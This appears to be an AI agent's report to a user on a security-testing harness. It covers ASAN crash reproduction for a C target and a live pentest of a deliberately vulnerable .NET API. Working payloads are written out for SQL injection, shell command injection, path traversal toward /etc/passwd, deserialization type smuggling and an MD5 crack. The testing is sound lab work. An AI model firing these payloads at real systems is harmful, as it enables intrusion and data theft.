C execution oracle targets/mrt

gcc:14 container · ASAN

The strongest signal in the harness: a bug only counts when a crafted input actually crashes the binary under AddressSanitizer, reproduced in a clean container. I built the target from the committed Dockerfile and replayed the four planted inputs. The valid seed exits clean; each bug trips a different sanitizer class — so dedup sees four distinct crashes, not one.

03

Live pentest targets/issueblot

real server · real HTTP

This is the part you asked about. I stood the .NET API up as a running server (Kestrel, port 5080), seeded it with a real SQLite DB — one row marked CONFIDENTIAL — and attacked each endpoint with real requests. The payoff: static analysis flags a sink; only a live run tells you whether the platform actually lets the exploit through. Two of the five don't fire over HTTP on .NET 8.

CWE-89

SQL injection — /issues/search

exploited sink · command.CommandText = "… LIKE '%" + query + "%' …"

The q parameter is concatenated straight into the query. A benign search that should match nothing instead returns every row — including the confidential one — and a UNION pulls data from an unrelated query.

GET /issues/search?q=…
# baseline — no such issue
?q=zzz-no-such-issue            → []

# auth-boundary bypass — dump everything
?q=' OR 1=1--                   → ["CONFIDENTIAL: prod DB credentials rotation",
                                   "Login page typo","Dark mode request", …]

# arbitrary extraction from a different query
?q=' UNION SELECT sqlite_version()-- → ["3.41.2", …]
verdictConfirmed exploitable. Full read access to the table regardless of the intended filter.
CWE-78

OS command injection — /reports/export

exploited · RCE sink · Arguments = "-c \"pandoc … /tmp/report_" + label + ".out\""

The label is concatenated into a /bin/sh -c string. Shell metacharacters break out and run arbitrary commands as the server user; their stdout is returned in the HTTP response.

POST /reports/export {"format":"html","label":"…"}
label = x; id; echo INJECTED_MARKER_ON_$(hostname); touch /tmp/pwned…; echo rce_ok #

# ← HTTP 200 response body (the injected command's stdout):
uid=1000(vscode) gid=1000(vscode) groups=1000(vscode),996(pipx),997(python),998(nvm),999(docker)
INJECTED_MARKER_ON_codespaces-aa33f9
rce_ok
# side effect on host FS: /tmp/pwned_by_issueblot  created
verdictConfirmed remote code execution. id output returned to the attacker and a file written to disk.
CWE-327 · 798

Weak hash + hardcoded pepper — /users/register

exploited sink · MD5.Create() over (password + const Pepper = "s3cr3t-pepper-v1")

Registration returns an MD5 hash peppered with a secret that is hardcoded in the source. Because the pepper is known and MD5 is fast, a leaked hash falls to a wordlist instantly.

POST /users/register → offline crack
server hash for "hunter2" = A9B0C1B131E82593220F84C8C090D1EF

MD5("hunter2" + "s3cr3t-pepper-v1") = a9b0c1b131e82593220f84c8c090d1ef  ← CRACKED
# pepper lifted from source → adds zero entropy to the attack
verdictConfirmed. Recomputing with the source-known pepper matches the server output — the "secret" provides no protection.
CWE-22

Path traversal — /attachments/{name}

latent · mitigated by framework sink · File.ReadAllBytes(Path.Combine(_storageRoot, name))

The code has no containment check — a real ../ or absolute path would escape the storage root. But over HTTP, .NET 8's Kestrel preserves %2f literally for a single-segment {name} route and normalizes real .. before routing, so the documented trigger never lands a real slash in the handler.

GET /attachments/… (—-path-as-is)
# baseline — legit file inside the root
/attachments/notes.txt                       → "public release notes v1"

# documented traversal trigger — reaches the sink, but %2f stays literal:
/attachments/..%2f..%2f..%2f..%2fetc%2fpasswd  → HTTP 500
   handler opened: '/var/issueblot/attachments/..%2f..%2f..%2fetc%2fpasswd'  ← not decoded
verdictReal code flaw, not exploitable over this route on default Kestrel. Would fire behind a proxy that decodes %2f, or from any non-HTTP caller. Static analysis was right about the sink; live testing bounded the reachability.
CWE-502

Insecure deserialization — /backups/restore

sink proven · HTTP path guarded sink · JsonConvert.DeserializeObject(body, { TypeNameHandling.All })

Over HTTP the endpoint throws before the deserializer runs — reader.ReadToEnd() is a synchronous body read, which ASP.NET Core blocks by default (AllowSynchronousIO=false). So I invoked the target's own compiled BackupService.Restore directly to prove the sink is genuinely dangerous.

HTTP path → then direct invocation of the target's Restore()
# over HTTP, every body: HTTP 500  InvalidOperationException: "Synchronous operations are disallowed"
                        at BackupService.cs:16  (before the deserializer)

# direct call into the target's compiled method:
body {"note":"nightly"}                       → JObject            (safe)
body {"$type":"System.Text.StringBuilder,…"}  → System.Text.StringBuilder  ← arbitrary type from the wire
body {"$type":"PwnGadget.RemoteCode, EvilAssembly"} → "Error resolving type … 'PwnGadget.RemoteCode, EvilAssembly'"
verdictTypeNameHandling.All honors attacker $type and reaches for attacker-named assemblies — the RCE precondition. Not reachable via this endpoint as-wired; reachable if the body read were async, or from any other caller of Restore.

What this run actually proves

  • The machinery works. C oracle reproduces 4/4 planted crashes with distinct sanitizer signatures; the static scanner finds 6/6 planted findings with zero misses. A null result on unseen code would now be trustworthy.
  • Live > static for reachability. The static scan (correctly) flagged all five .NET sinks. Live exploitation showed only three fire over HTTP — the other two are real code flaws neutralized by .NET 8 platform defaults (%2f route encoding; AllowSynchronousIO). That gap is exactly the information a live pentest adds.
  • Contamination is handled. Both targets are original, unmarked code; the answer keys live outside the scanned trees. So a "find" reflects reasoning, not recall — and the next step is pointing the same rig at code the model has never seen (your own private repos).
